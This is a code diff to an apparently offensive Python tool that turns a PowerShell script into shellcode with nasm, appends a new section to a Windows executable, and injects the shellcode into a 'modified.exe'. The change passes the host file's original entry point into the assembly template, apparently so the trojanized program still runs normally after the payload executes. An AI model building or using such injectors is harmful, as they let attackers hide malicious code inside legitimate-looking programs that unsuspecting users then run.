@@ -72,10 +72,13 @@ def extractShellcode(filename):
         shellcode = f.read(shellcodeSize)
         return shellcode
 
-def craftShellcode(scriptPath):
+def craftShellcode(filePath, scriptPath):
     '''write the ps script to an asm file and compile it to create shellcode'''
     '''structure for 64-bit PEB is taken from here:
     https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/'''
+
+    pe = pefile.PE(filePath)
+    originalEntryPoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
 
     print("[*] Reading powershell script")
     with open(scriptPath, "r") as f:
@@ -88,7 +91,7 @@ def craftShellcode(scriptPath):
     #compile the shellcode to a COFF file then extract it
     print("[*] Compiling shellcode")
     asmFile = open("shellFile.S", "w")
-    asmFile.write(asmTemplate %("powershell.exe"))
+    asmFile.write(asmTemplate %("powershell.exe", originalEntryPoint))
     asmFile.close()
     system("nasm -f win64 shellFile.S -o compiled.obj")
     compiledCode = extractShellcode("compiled.obj")
@@ -119,7 +122,7 @@ if __name__ == "__main__":
     peFilePath = sys.argv[1]
     psScriptPath = sys.argv[2]
 
-    shellcode = craftShellcode(psScriptPath)
+    shellcode = craftShellcode(peFilePath, psScriptPath)
     outputFile = "modified.exe"
     addSection(peFilePath, len(shellcode), outputFile)
     injectShellcode(outputFile, shellcode)
